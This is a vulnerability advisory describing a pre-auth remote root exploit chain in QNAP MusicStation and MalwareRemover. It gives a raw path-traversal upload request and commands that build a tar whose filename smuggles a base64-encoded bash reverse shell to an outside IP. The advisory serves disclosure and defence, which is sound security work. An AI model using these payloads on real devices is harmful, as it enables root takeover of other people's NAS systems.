@@ -1,0 +1,218 @@
+id: 36314
+date: 05/28/2021
+title: QNAP MusicStation / MalwareRemover File Upload / Command Injection Vulnerabilities
+author: polict
+cves: CVE-2020-36197, CVE-2020-36198
+
+QNAP MusicStation/MalwareRemover Pre-Auth Remote Code Execution
+Summary
+
+QNAP MusicStation and MalwareRemover official apps are affected by an arbitrary file upload and a command injection vulnerabilities, leading to pre-auth remote root command execution.
+Product description (from vendor)
+
+“QNAP (Quality Network Appliance Provider) is devoted to providing comprehensive solutions in software development, hardware design and in-house manufacturing.”. For more information visit https://qnap.com/.
+CVE(s)
+
+    CVE-2020-36197
+    CVE-2020-36198
+
+Details
+Root cause analysis
+Pre-auth arbitrary file write in MusicStation
+
+“Music Station is a web-based music player for users to enjoy their music collection on the NAS.” from QNAP App Center.
+
+MusicStation is not pre-installed on the QNAP device, but it is one of the most popular apps in the QNAP ecosystem, counting more than 5 million installations in the QNAP App Center. The app allows the user to manage their music on the NAS device through a web browser.
+
+The file musicstation/api/upload.php allows anyone to upload an album cover on the NAS Device:
+
+
+    //upload temp album/artist art to NAS
+[1] $arttype = getHTTPValue('arttype','');//album,artist
+    if(!empty($arttype)){
+        $art_upload_temp = MS_CONFIG_FOLDER."arttemp/";
+        [...]
+        $file = $_FILES['singleFile'];
+        $fileInfo = pathinfo($file['name']);	
+[2]     if(strtolower($fileInfo['extension']) == "jpg" || strtolower($fileInfo['extension']) == "jpeg" || strtolower($fileInfo['extension']) == "png"){
+            $tempfileid = uniqid($arttype."_");
+[3]         $temppath =  $art_upload_temp.$tempfileid.".".strtolower($fileInfo['extension']);
+            if(move_uploaded_file($file['tmp_name'],$temppath)){
+                _Output($output,array("status"=>1,"fid"=>encodeFilePath($tempfileid.".".strtolower($fileInfo['extension']))));
+
+At [1] the HTTP parameter ‘arttype’ is loaded from the user HTTP request. At [2] the user-input filename extension (HTTP POST “singleFile” parameter’s name) is verified to be one of an image file: “jpeg”, “jpg” or “png”. At [3] the destination filename is assembled using the user-input arttype as a prefix (https://www.php.net/uniqid) and right after it is moved there. By providing a malicious arttype it is possible to write arbitrary files to a partially controlled location (specifically, the app will suffix the attacker’s provided filename with _[a-f0-9]{13}\.(jpg|jpeg|png)) in the QTS file system, since MusicStation (and all the other apps by default) runs with administrative privileges (root).
+Proof-of-concept
+
+The following HTTP request plants a file with filename prefix /tmp/polict:
+
+
+POST /musicstation/api/upload.php?arttype=../../../../../../tmp/polict HTTP/1.1
+Host: qnap.local:8080
+Content-Type: multipart/form-data; boundary=---------------------------41226441225792835292630842014
+Connection: close
+
+-----------------------------41226441225792835292630842014
+Content-Disposition: form-data; name="singleFile"; filename="a.jpg"
+Content-Type: text/plain
+
+any content
+-----------------------------41226441225792835292630842014--
+
+The final path is disclosed in the HTTP response in the fid field, e.g. Li4vLi4vLi4vLi4vLi4vLi4vdG1wL3BvbGljdF81ZWUyOGU5YTAyZTM5LmpwZw-3D-3D is ../../../../../../tmp/polict_5ee28e9a02e39.jpg, which is /tmp/polict_5ee28e9a02e39.jpg confirmed by a shell check:
+
+# cat /tmp/polict_5ee28e9a02e39.jpg
+any content
+
+Command Injection in MalwareRemover
+
+“The Malware Remover is designed to protect your Turbo NAS against harmful software. QNAP strongly recommends that you install this app to avoid potential security risks.” from QNAP App Center.
+
+MalwareRemover is a pre-installed and “non-removable” app ("- For device security reasons, you can no longer remove Malware Remover from App Center." from https://www.qnap.com/en/app_releasenotes/list.php?app_choose=MalwareRemover) running on the NAS device.
+
+By default it runs a malware scan via cronjob everyday at 3 AM, however the time can be changed in the app’s settings. sh /share/CACHEDEV1_DATA/.qpkg/MalwareRemover/MalwareRemover.sh scan is the registered cronjob command to perform the scan. In turn it executes python /share/CACHEDEV1_DATA/.qpkg/MalwareRemover/modules/centre.pyc --check, which will then execute sh /share/CACHEDEV1_DATA/.qpkg/MalwareRemover/MalwareRemover_scan.sh. Such file will cycle and run all the anti-malware rules included in the app:
+
+    [...]
+    source ${QPKG_ROOT}/common.sh
+    [...]
+[1] modules=$(get_modules)
+    [...]
+    for prog in $modules; do
+        if [ ! -f ${STOPTYPE_PATH} ]; then
+            echo $prog | grep -q '.pyc$'
+            is_pyc=$?
+            echo $prog | grep -q '.py$'
+            is_py=$?
+            if [ ${is_pyc} = 0 ] || [ ${is_py} = 0 ]; then
+                prog_type=${PYTHON}
+            else
+                echo $prog | grep -q '.sh$'
+                if [ $? = 0 ]; then
+                    prog_type="/bin/sh"
+                else
+[2]                 prog_type="/bin/sh -c"
+                fi
+            fi
+            LOG "[$prog]"
+            cmd="${prog_type} $prog >> ${LOGFILE} 2>&1"
+            LOG "cmd = $cmd"
+[3]         unit_status=`$cmd`
+    [...]
+
+Whereas common.sh contains:
+
+
+    [...]
+    TMP_PATH="/tmp/.malware_remover"
+    #use this file to recognize which stop is
+    STOPTYPE_PATH=${TMP_PATH}/stop_type
+    [...]
+    function get_modules()
+    {
+[4] modules=`find $QPKG_ROOT/modules -regex "$QPKG_ROOT/modules/[0-9][0-9]_[0-9a-zA-Z_]\+\(\.[0-9a-zA-Z_\-]\+\)\?" 2>/dev/null | busybox sort -r`
+        echo ${modules}
+    }
+    [...]
+
+At [1] the function get_modules is called, which at [4] lists the available files in a specific MalwareRemover folder ($QPKG_ROOT refers to the MalwareRemover QNAP Package folder location which by default is /share/CACHEDEV1_DATA/.qpkg/MalwareRemover/ ) matching the [0-9][0-9]_[0-9a-zA-Z_]\+\(\.[0-9a-zA-Z_\-]\+\)\? pattern (by the way, this stricter pattern broke the first “file write -> rce” gadget identified), and its output is saved to the modules variable. At [2] if the current “module” filename doesn’t match the pattern (\.py|\.pyc|\.sh)$, /bin/sh -c is used as launcher program, which will interpret its following arguments as shell commands at [3]. The default MalwareRemover installation includes 19 modules, mostly in pyc format (decompilable using uncompyle6). modules/02_autoupgrade.pyc is vulnerable to a command injection and an arbitrary file write in an arbitrary file path (both vulnerabilities allow Remote Code Execution (RCE) as root (administrator)):
+
+
+    [...]
+    config_path = tostring([47, 116, 109, 112, 47, 99, 111, 110, 102, 105, 103, 47])
+    [...]
+    tmpconfig_status = check_tmp_config(config_path)
+    [...]
+
+config_path is a bytearray containing “/tmp/config”, which will be used in check_tmp_config, defined in modules/autoupgrade.pyc:
+
+
+
+    def check_tmp_config(config_path):
+        [...]
+        try:
+[1]         mount_config()
+        [...]
+
+        match_files = []
+        for key in akey:
+            try:
+                match_files += keyword_path(config_path, key, check_mount=True)
+            [...]
+
+[2]     for dirpath, dirnames, filenames in os.walk(config_path):
+            for filename in filenames:
+                filepath = '%s/%s' % (dirpath, filename)
+                try:
+                    if tarfile.is_tarfile(filepath) is True and
+[3]                 is_tarball_match(filepath, ['@openssh']) is True:
+                        print('%s is malicious tarfile' % filepath)
+
+At [1] mount_config is called, which will mount a temporary file system in /tmp/config (config_path). At [2] the content of the file system mounted in “/tmp/config” is listed (Note: between [1] and [2] any file created/moved in /tmp/config will be read at [2], indeed this race condition will be exploited) and checked if it contains a tar file and if is_tarball_match returns True. tarfile.is_tarfile doesn’t require the path to have any particular file extension. is_tarball_match is defined in gadget.py:
+
+ 
+    def is_tarball_match(filepath, rules):
+        [...]
+        tmp_dir = os.path.join(get_hdd_tmp_path(), '.remover_%s' % id_generator())
+        LOG.debug('filepath = %s, tmp_dir = %s', filepath, tmp_dir)
+        try:
+[1]         tar = tarfile.open(filepath)
+        [...]
+
+[2]     tar.extractall(tmp_dir)
+        [...]
+
+        for dirpath, dirnames, filenames in os.walk(tmp_dir):
+            for filename in filenames:
+                filepath = '%s/%s' % (dirpath, filename)
+                LOG.debug('check tarball file = %s', filepath)
+                for rule in rules:
+                    try:
+                        result = None
+[3]                     string_cmd = 'strings %s | grep -E "%s"' % (filepath, rule)
+                        pobj = os.popen(string_cmd)
+
+At [1] the tar file is parsed and at [2] all the file entries are extracted in a temporary folder. This is vulnerable to path traversal which enables to write/overwrite any file in the file system with an arbitrary file, like the documentation warns (Warning Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots ".."), however there’s a more immediate way than that to achieve Remote Code Execution. At [3] each filename included in the tar file is checked through an unsafe shell command execution. Via a malicious filename in the input tar file it is possible to achieve Remote Code Execution as root (administrator), e.g. using https://github.com/ptoomey3/evilarc and a bash TCP reverse shell payload:
+
+ 
+$ git clone https://github.com/ptoomey3/evilarc
+Cloning into 'evilarc'...
+remote: Enumerating objects: 12, done.
+remote: Total 12 (delta 0), reused 0 (delta 0), pack-reused 12
+Unpacking objects: 100% (12/12), done.
+$ cd evilarc/
+$ echo -n 'bash -i >& /dev/tcp/172.16.42.114/8383 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuNDIuMTE0LzgzODMgMD4mMQ==
+$ touch ';echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuNDIuMTE0LzgzODMgMD4mMQ==|base64${IFS}-d|bash;#'
+$ ./evilarc.py -f a.tar -o unix -d0 -p "/tmp/polict" ';echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuNDIuMTE0LzgzODMgMD4mMQ==|base64${IFS}-d|bash;#'
+Creating a.tar containing /tmp/polict/;echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuNDIuMTE0LzgzODMgMD4mMQ==|base64${IFS}-d|bash;#
+
+The next time MalwareRemover finds and scans the such file, it will spawn a TCP reverse shell as root.
+Proof of concept
+
+The full PoC code will be released at a later time.
+Impact
+
+By chaining both issues it’s possible to gain pre-auth Remote Code Execution with root privileges on a remote QNAP NAS.
+Remediation
+
+Upgrade QNAP MusicStation and MalwareRemover to the latest version available. (Note: we didn’t verify the patches.)
+Disclosure timeline
+
+    28/09/2020: Submission to ZDI’s portal
+    26/10/2020: While we were waiting for ZDI’s submission feedback, QNAP fixed the “file write -> rce” gadget vulnerability in MalwareRemover, breaking the full chain exploit
+    27/10/2020: polict finds an alternative gadget to achieve pre-auth remote root rce again and updates the report submitted to ZDI
+    14/05/2021: QNAP’s and ZDI’s advisories are made public:
+        MusicStation:
+            https://www.qnap.com/zh-tw/security-advisory/qsa-21-08
+            https://www.zerodayinitiative.com/advisories/ZDI-21-591/
+        MalwareRemover:
+            https://www.qnap.com/zh-tw/security-advisory/qsa-21-16
+            https://www.zerodayinitiative.com/advisories/ZDI-21-592/
+    19/05/2021: Shielder’s advisory is made public
+
+Credits
+
+    `polict` of Shielder
+
+This advisory was first published on https://www.shielder.it/advisories/qnap-musicstation-malwareremover-pre-auth-remote-code-execution/
+
+#  0day.today [2023-03-27]  #
